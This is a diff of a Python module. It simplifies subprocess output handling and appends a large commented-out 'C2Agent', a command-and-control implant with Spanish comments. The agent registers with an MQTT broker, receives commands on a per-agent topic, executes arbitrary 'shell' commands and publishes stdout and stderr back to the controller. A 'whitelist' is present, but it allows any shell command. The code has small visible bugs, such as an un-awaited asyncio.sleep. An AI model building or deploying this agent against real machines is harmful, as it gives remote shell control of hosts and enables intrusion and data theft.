@@ -63,8 +63,8 @@ def _execute_command(cmd_type: str, args: dict) -> tuple[str, str, int]:
             timeout=15,
         )
         return (
-            cleaned := (c.strip() if (c := getattr(comp, "stdout", "")) else ""),
-            cleaned_err := (c.strip() if (c := getattr(comp, "stderr", "")) else ""),
+            completed.stdout.strip() if completed.stdout else "",
+            completed.stderr.strip() if completed.stderr else "",
             completed.returncode,
         )
     except subprocess.TimeoutExpired as exc:
@@ -165,3 +165,179 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+# # agent/agent.py
+
+# import asyncio
+# import json
+# import logging
+# import os
+# import subprocess
+# import uuid
+# from datetime import datetime, timezone
+# from typing import Dict, Any, Optional
+
+# import paho.mqtt.client as mqtt
+
+# # --- Configuración desde variables de entorno ---
+# AGENT_ID = os.getenv("AGENT_ID", f"agent-{uuid.uuid4().hex[:8]}")
+# C2_STATIC_TOKEN = os.getenv("C2_STATIC_TOKEN", "default-token")
+# MQTT_HOST = os.getenv("MQTT_HOST", "localhost")
+# MQTT_PORT = int(os.getenv("MQTT_PORT", 1883))
+# MQTT_USER = os.getenv("MQTT_USER", "c2_user")
+# MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "c2_pass")
+# HEARTBEAT_INTERVAL = int(os.getenv("HEARTBEAT_INTERVAL", 30))
+
+# # --- Configuración de Seguridad (Whitelist) ---
+# # Comandos permitidos por el agente. Esto es CRÍTICO para la seguridad.
+# WHITELISTED_COMMANDS = {
+#     "system_info": "systeminfo",  # Windows
+#     "shell": "cmd",               # Windows
+#     "ls": "ls",                   # Linux/macOS
+#     "whoami": "whoami",           # Linux/macOS
+#     "pwd": "pwd",                 # Linux/macOS
+#     # Añade aquí los comandos que tu agente pueda ejecutar
+# }
+
+# # --- Configuración de Logging ---
+# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# log = logging.getLogger(__name__)
+
+
+# class C2Agent:
+#     """A simple C2 agent that connects to an MQTT broker and executes commands."""
+
+#     def __init__(self):
+#         self.agent_id = AGENT_ID
+#         self.client = mqtt.Client(client_id=self.agent_id)
+#         self.command_topic = f"c2/commands/{self.agent_id}"
+#         self.result_topic = f"c2/results/{self.agent_id}"
+#         self.heartbeat_topic = f"c2/heartbeat/{self.agent_id}"
+        
+#         # Configurar callbacks de MQTT
+#         self.client.on_connect = self._on_connect
+#         self.client.on_message = self._on_message
+#         self.client.username_pw_set(MQTT_USER, MQTT_PASSWORD)
+
+#     def _on_connect(self, client, userdata, flags, rc):
+#         """Callback llamado cuando el agente se conecta al broker MQTT."""
+#         if rc == 0:
+#             log.info(f"✅ Agent '{self.agent_id}' connected to MQTT broker at {MQTT_HOST}:{MQTT_PORT}")
+#             # Suscribirse al topic de comandos para este agente
+#             client.subscribe(self.command_topic)
+#             log.info(f"🔔 Subscribed to command topic: {self.command_topic}")
+#             # Enviar registro inicial y heartbeat
+#             self._register_agent()
+#             self._send_heartbeat()
+#         else:
+#             log.error(f"❌ Failed to connect, return code {rc}\n")
+
+#     def _on_message(self, client, userdata, msg):
+#         """Callback llamado cuando se recibe un mensaje."""
+#         try:
+#             payload = json.loads(msg.payload.decode())
+#             log.info(f"📨 Received command on topic {msg.topic}: {payload}")
+#             # Procesar el comando en un hilo separado para no bloquear el loop de MQTT
+#             asyncio.run(self.process_command(payload))
+#         except json.JSONDecodeError:
+#             log.error("⚠️ Received non-JSON message.")
+#         except Exception as e:
+#             log.error(f"⚠️ Error processing message: {e}")
+
+#     def _register_agent(self):
+#         """Registra el agente en el servidor C2."""
+#         registration_payload = {
+#             "agent_id": self.agent_id,
+#             "token": C2_STATIC_TOKEN,
+#             "capabilities": list(WHITELISTED_COMMANDS.keys())
+#         }
+#         self.client.publish("c2/register", json.dumps(registration_payload))
+#         log.info(f"📮 Sent registration to 'c2/register'")
+
+#     def _send_heartbeat(self):
+#         """Envía un heartbeat periódico."""
+#         heartbeat_payload = {"timestamp": datetime.now(timezone.utc).isoformat()}
+#         self.client.publish(self.heartbeat_topic, json.dumps(heartbeat_payload))
+#         log.info("💓 Sent heartbeat")
+
+#     # --- ESTA ES LA LÓGICA QUE NECESITABAS AÑADIR ---
+#     async def process_command(self, command_data: Dict[str, Any]):
+#         """Procesa un comando recibido del servidor C2."""
+#         command_type = command_data.get("type")
+#         args = command_data.get("args", {})
+#         command_id = command_data.get("id", "unknown-id")
+
+#         log.info(f"⚙️ Processing command '{command_type}' with args: {args}")
+
+#         if command_type not in WHITELISTED_COMMANDS:
+#             await self._send_result(command_id, "error", f"Command '{command_type}' is not whitelisted.")
+#             return
+
+#         # Construir el comando a ejecutar
+#         base_command = WHITELISTED_COMMANDS[command_type]
+        
+#         # Manejar comandos especiales que necesitan más lógica
+#         if command_type == "shell":
+#             # Para el comando 'shell', el payload es el comando completo a ejecutar
+#             full_command = args.get("cmd", "")
+#             if not full_command:
+#                 await self._send_result(command_id, "error", "Shell command requires 'cmd' argument.")
+#                 return
+#         else:
+#             # Para otros comandos, los args son los argumentos del comando base
+#             full_command = f"{base_command} {' '.join(args.values())}"
+
+#         try:
+#             # Ejecutar el comando de forma segura con un timeout
+#             process = await asyncio.create_subprocess_shell(
+#                 full_command,
+#                 stdout=asyncio.subprocess.PIPE,
+#                 stderr=asyncio.subprocess.PIPE,
+#                 text=True
+#             )
+            
+#             stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=15.0)
+
+#             if process.returncode == 0:
+#                 await self._send_result(command_id, "success", stdout, stderr)
+#             else:
+#                 await self._send_result(command_id, "error", stdout, stderr)
+
+#         except asyncio.TimeoutError:
+#             await self._send_result(command_id, "error", "Command execution timed out.")
+#         except Exception as e:
+#             await self._send_result(command_id, "error", f"Failed to execute command: {str(e)}")
+
+#     async def _send_result(self, command_id: str, status: str, stdout: str = "", stderr: str = ""):
+#         """Envía el resultado de un comando de vuelta al servidor C2."""
+#         result_payload = {
+#             "command_id": command_id,
+#             "status": status,
+#             "stdout": stdout,
+#             "stderr": stderr,
+#             "timestamp": datetime.now(timezone.utc).isoformat()
+#         }
+#         # Publicamos de forma síncrona ya que paho-mqtt no es asíncrono por defecto
+#         self.client.publish(self.result_topic, json.dumps(result_payload))
+#         log.info(f"📤 Sent result for command '{command_id}' with status '{status}'")
+
+#     def run(self):
+#         """Conecta el agente al broker y empieza el loop de eventos."""
+#         try:
+#             self.client.connect(MQTT_HOST, MQTT_PORT, 60)
+#             # Programar el heartbeat periódico
+#             self.client.loop_start()
+#             while True:
+#                 self._send_heartbeat()
+#                 asyncio.sleep(HEARTBEAT_INTERVAL)
+#         except KeyboardInterrupt:
+#             log.info("🛑 Agent stopped by user.")
+#         finally:
+#             self.client.loop_stop()
+#             self.client.disconnect()
+#             log.info("🔌 Disconnected from MQTT broker.")
+
+
+# if __name__ == "__main__":
+#     agent = C2Agent()
+#     agent.run()
